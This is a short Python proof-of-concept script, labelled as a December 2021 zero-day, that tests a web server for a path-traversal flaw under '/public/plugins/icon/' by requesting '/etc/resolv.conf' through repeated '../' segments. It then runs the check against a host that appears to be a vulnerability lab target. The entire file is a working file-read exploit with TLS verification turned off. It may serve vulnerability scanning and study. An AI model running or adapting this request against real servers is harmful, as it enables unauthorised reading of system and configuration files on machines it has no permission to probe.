import requests
# 0day at 2021.12.7
def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)

    uris = ['/public/plugins/icon/../../../../../../../../etc/resolv.conf']
    hits = ['nameserver']

    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        with requests.Session() as session:
            for target in targets:
                req = requests.Request(method='GET', url=target, )
                prep = req.prepare()
                prep.url = target
                response = session.send(prep, timeout=10, verify=False)
                for hit in hits:
                    if hit in response.text and response.status_code in [200]:
                        output = response.text

                        return True, host, target, output
    except Exception as error:
        return False
    return False


print(check('vulfocus.fofa.so', 12186))
